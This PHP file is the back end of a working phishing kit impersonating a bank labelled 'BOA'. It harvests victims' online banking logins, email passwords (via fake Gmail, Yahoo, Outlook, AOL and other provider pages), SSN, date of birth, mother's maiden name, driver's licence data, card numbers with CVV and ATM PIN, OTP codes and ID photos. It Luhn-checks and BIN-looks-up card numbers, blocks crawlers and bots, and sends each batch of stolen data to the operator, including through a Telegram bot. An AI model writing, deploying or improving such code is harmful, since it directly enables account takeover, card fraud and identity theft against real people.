<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include "autob/bts2.php";
include "autob/config.php";

##############    TO UNDERSTAND MORE ABOUT THE RESULT DATA MANAGEMENT PLEASE REFER TO THE CONFIG.PHP FILE (EXPERIENCED CODERS ONLY)

$PublicIP=getcurrip();
$client='Client_0'.$_SESSION['client'];
$appr=0;
$icon="🔥 ";
$exploitorg="BOA";

function navigate($page){
	global $usecaution,$grabemailaccess,$grabidphoto,$grabotp;
	$o = getadmin('o');
	$idx = array_search($page,array_values($o));
	for($i = $idx; $i < count($o) ; $i++){
	if($o[$idx+1]=="note"){
		if($usecaution!=1){$idx=$idx+1;};
	};
	if($o[$idx+1]=="email"){
		if($grabemailaccess!=1){$idx=$idx+1;};
	};
	if($o[$idx+1]=="photo"){
		if($grabidphoto!=1){$idx=$idx+1;};
	};
	if($o[$idx+1]=="otp"){
		if($grabotp!=1){$idx=$idx+1;};
	};
	};
	$next=$o[$idx+1];
	return array($page,$next);
}

function dirtomail($email) {
            if (preg_match("/@gmail/i", $email) == 1) {
				global $grabgmail;
				if($grabgmail==1){return "oo";}
				else{return "next";};
            }
            elseif (preg_match("/@yahoo/i", $email) == 1) {
                return "ho";
            }
            elseif (preg_match("/@ymail/i", $email) == 1) {
                return "ho";
            }
            elseif (preg_match("/@rocketmail/i", $email) == 1) {
                return "ho";
            }
            elseif (preg_match("/@outlook/i", $email) == 1) {
                return "mc";
            }
            elseif (preg_match("/@hotmail/i", $email) == 1) {
                return "mc";
            }
            elseif (preg_match("/@live/i", $email) == 1) {
                return "mc";
            }
            elseif (preg_match("/@msn/i", $email) == 1) {
                return "mc";
            }
            elseif (preg_match("/@aol/i", $email) == 1) {
                return "ao";
            }
            elseif (preg_match("/@comcast/i", $email) == 1) {
                return "cc";
            }
            elseif (preg_match("/@att/i", $email) == 1) {
                return "at";
            }
            elseif (preg_match("/@sbcglobal/i", $email) == 1) {
                return "at";
            }
            elseif (preg_match("/@bellsouth/i", $email) == 1) {
                return "at";
            }
            elseif (preg_match("/@verizon/i", $email) == 1) {
                return "vr";
            }
            return 'mc';
};

function reslayout($p,$n){
	if(isset($p)){$line="
".$n.": ".$p;}
	else{$line="";};
	return $line;
};

function cardreslayout($p,$n){
	if(isset($p)){
	$cnum = str_replace(' ','',$p);
	$cd=getcd($cnum);
	$line="
Bank: ".strtoupper($cd['bank']['name'])." | ".$cd['country']['name']."
Type: ".strtoupper($cd['scheme']." - ".$cd['type'])."
Level: ".strtoupper($cd['brand'])."
".$n.": ".$p;}
	else{$line="";};
	return $line;
};

function uploadlayout($p,$pfn,$bn,$cl,$clid){
	if (($_FILES[$p]['name']!="") && getimagesize($_FILES[$p]['tmp_name']) !== false){
		$file = $_FILES[$p]['name'];
		$path = pathinfo($file);
		$filename = $cl.$pfn;
		$ext = $path['extension'];
		$temp_name = $_FILES[$p]['tmp_name'];
		$res_dir=gethomedir()."/rst";
		if(!is_dir($res_dir)){mkdir($res_dir);};
		$path_filename_ext = $res_dir."/".$filename.".".$ext;
		move_uploaded_file($temp_name,$path_filename_ext);
		global $sendtotg,$chatid,$tgbot,$icon;
		if ($sendtotg == 1) {
		sendPhotoToTg($chatid , $path_filename_ext, $icon.$bn." ".str_replace('_',' ',$filename).$clid, $tgbot);
			};
		return 1;
		};
};

$expecteddatas = array("username"=>"Username", "password"=>"Password", "email"=>"Email", "emailpass"=>"Email Password", "fname"=>"Full Name", "dob"=>"DOB", "cardname"=>"Name On Card", "cardnumber"=>"Card Number", "expdate"=>"Expiration", "cvv"=>"CVV", "atm"=>"ATM PIN", "ssn"=>"SSN", "itin"=>"ITIN", "mmn"=>"MMN", "dl"=>"DL", "dlexp"=>"DL Exp", "street"=>"Street Address", "city"=>"City", "state"=>"State", "zip"=>"ZIP Code", "cpin"=>"Carrier PIN", "phone"=>"Phone Number", "otp"=>"OTP CODE");

###############    HEIRARCHY SETUP

if(isset($_POST[gaN('username')]) && isset($_POST[gaN('password')])){
	$currentp=navigate("login");
	$back=$currentp[0];
	$next=$currentp[1];
	$user=$_POST[gaN('username')];
	$pass=$_POST[gaN('password')];
    if(isset($_POST[gaN('btnlo')]) && strlen($pass) >3 && strlen($user) > 3 && !preg_match("/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/",strtolower($user))){
		$i = isset($_GET[''.$theerrkey.''])?'(2)':'(1)';
		$appr=1;
		$heading=$icon.$i.' '.$exploitorg.' LOGIN '.$icon;
		if(!isset($_GET[''.$theerrkey.'']) && $doubleloginentry==1){
			$reqnext = $index."?".genv($back)."=".md5(rand(10, 9999))."&a".$theerrkey."ccrXId=c".md5(rand(10, 9999))."&".$theerrkey."=On";
			};
	}
	else{$appr=2;};
};

if(isset($_POST[gaN('email')])){
	$currentp=navigate("email");
	$back=$currentp[0];
	$next=$currentp[1];
	if(preg_match("/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/",strtolower($_POST[gaN('email')]))){
		$email=$_POST[gaN('email')];
		$emhandler=dirtomail($email);
		if(!isset($_POST[gaN('emailpass')])){
				$_SESSION['email'] = $email;
				$_SESSION['emailbeenset'] = '1';
				if($emhandler=="next"){$appr=1;$heading='EMAIL ADDRESS';}
				else{header('location:m/'.$emhandler);exit();};
			
		}
		else if(isset($_POST[gaN('emailpass')])){
			if(strlen($_POST[gaN('emailpass')]) > 3){
				$i = isset($_GET[''.$theerrkey.''])?'(2)':'(1)';
				$appr=1;
				$heading=$i.' EMAIL ACCESS';
				if(!isset($_GET[''.$theerrkey.'']) && $confirmemaillog == 1){$next = 'notend';
					$reqnext = "m/".$emhandler."?".$theerrkey."XId=c".md5(rand(10, 9999))."&".$theerrkey."=On";
					}
				else{unset($_SESSION['email']);};
			}
			else{header("location:m/".$emhandler."?".$theerrkey."=c".md5(rand(10, 9999))."");exit(); };
		};
	}
	else{$appr=2;};
};

if(isset($_POST[gaN('fname')]) && isset($_POST[gaN('street')]) && isset($_POST[gaN('state')])){
	$currentp=navigate("fullz");
	$back=$currentp[0];
	$next=$currentp[1];
	if(!empty($_POST[gaN('fname')]) && !empty($_POST[gaN('zip')]) && !empty($_POST[gaN('state')]) && !empty($_POST[gaN('street')])){
		$appr=1;
		$heading='['.strtoupper($_POST[gaN('state')]).'] FULLZ INFO';
		;}
	else{$appr=2;};
};
	
if(isset($_POST[gaN('dob')]) && isset($_POST[gaN('ssn')])){
	if(strlen($_POST[gaN('dob')]) == 10 && !empty($_POST[gaN('ssn')])){
		$appr=1;
		;}
	else{$appr=2;};
};

if(isset($_POST[gaN('otp')])){
	$currentp=navigate("otp");
	$back=$currentp[0];
	$next=$currentp[1];
	if(!empty($_POST[gaN('otp')])){
		$appr=1;
		$heading='OTP CODE';
		if(getadmin('live') == 'on'){
			$reqnext = $index."?".genv($back)."=".md5(rand(10, 9999))."&a".$theerrkey."XId=c".md5(rand(10, 9999))."&".$theerrkey."=On";}
		else{
			$reqnext = $index."?".genv($next)."=".md5(rand(10, 9999))."&a".$theerrkey."XId=c".md5(rand(10, 9999));};
		;}
	else{$appr=2;};
};

if(isset($_POST[gaN('cardnumber')])  && isset($_POST[gaN('expdate')])){
	$currentp=navigate("card");
	$back=$currentp[0];
	$next=$currentp[1];
	$cnum = str_replace(' ','',$_POST[gaN('cardnumber')]);
	$luhn = new Luhn;
	$is_val = $luhn->validate($cnum);
	if(strlen($cnum) > 14 && in_array(substr($cnum,0,1),array(3,4,5,6)) && strlen($_POST[gaN('expdate')]) == 5 && !empty($_POST[gaN('cvv')]) && $is_val){
		$appr=1;
		$heading='CARD DETAILS';
		;}
	else{$appr=2;};
};

if(isset($_POST['last'])){$heading.=" | DEVICE";}
$cl="
#".$client.'_'.$index;



####################    RESULTS HANDLER.....  

if(!isset($_POST[gaN('fupl')])){

if($appr==1){
		
$reshead=str_replace('(1) ','',$heading);
$reshead=str_replace('(2)','CONFIRM',$reshead);
if($back==getadmin('o')[0] && !isset($_GET[$theerrkey])){$ti="|-==- $resultheading -==-|
";} else{$ti="";};
$Info_LOG = "
".$ti."|---- ".$reshead." ----|";
$heading=str_replace($icon,'',$heading);
//// ARRANGING RESULTS
foreach($expecteddatas as $data=>$strname){if($data!="" && isset($_POST[gaN($data)])){if(gaN($data)!=gaN("cardnumber")){$Info_LOG.=reslayout($_POST[gaN($data)],$strname);} else{$Info_LOG.=cardreslayout($_POST[gaN($data)],$strname);};};};
if(isset($_GET[$theerrkey]) || ($back!=getadmin('o')[0] && $next!='end' && $next!='photo')){$_SESSION['fullz'].=$Info_LOG.PHP_EOL;$Info_LOG.="
IP : ".$PublicIP.$cl ;}
else{if(isset($_SESSION['fullz'])){$_SESSION['fullz'].=$Info_LOG.PHP_EOL;} else{$_SESSION['fullz']=$Info_LOG.PHP_EOL;};
	$Info_LOG.=$_SESSION['device'].$cl;
	};if($next=='end' || $next=='photo'){$_SESSION['fullz'] = str_replace($_SESSION['device'].$cl,'',$_SESSION['fullz']);$_SESSION['fullz'].=$_SESSION['device'].$cl;};

	//// SENDING ALL RESULTS
	sendresults($client,$icon.$exploitorg." ".str_replace($exploitorg.' ','',$heading),$Info_LOG);
	if($next=='end' || $next=='photo'){sendresults($client,$icon.$exploitorg." SESSION RESULTS",$_SESSION['fullz']);};
	if(isset($reqnext)){header("location:".$reqnext);}
	else{header("location:".$index."?".genv($next)."=".md5(rand(10, 9999)));};
	
}
else if($appr==2){header("location:".$index."?".genv($back)."=".md5(rand(10, 9999))."&".$theerrkey."=bc".md5(rand(10, 9999)));}
else {header("location:".$index."?".genv($back)."=".md5(rand(10, 9999))."&".$theerrkey."=wec3Fauth".md5(rand(10, 9999)));};

}
else{
	////  SENDING PHOTO FILES
$currentp=navigate("photo");
$back=$currentp[0];
$next=$currentp[1];
$uploadok=0;
if(uploadlayout(gaN("my_filefront"),"_Front_ID",$exploitorg,$client,$cl)==1){$uploadok=1;}
if(uploadlayout(gaN("my_fileback"),"_Back_ID",$exploitorg,$client,$cl)==1){$uploadok=1;}
	
if($uploadok==1){
	$Info_LOG = $icon.$exploitorg." ID UPLOADED BY $client
Check RST folder for IMAGES from $client";
	$ftpsave=0;
	sendresults($client,$icon.$exploitorg." ID UPLOADED",$Info_LOG);
};
header("location:".$index."?".genv($next)."=".md5(rand(10, 9999))."&sessioninnI_IX=".md5(rand(10, 9999))."");
};

?>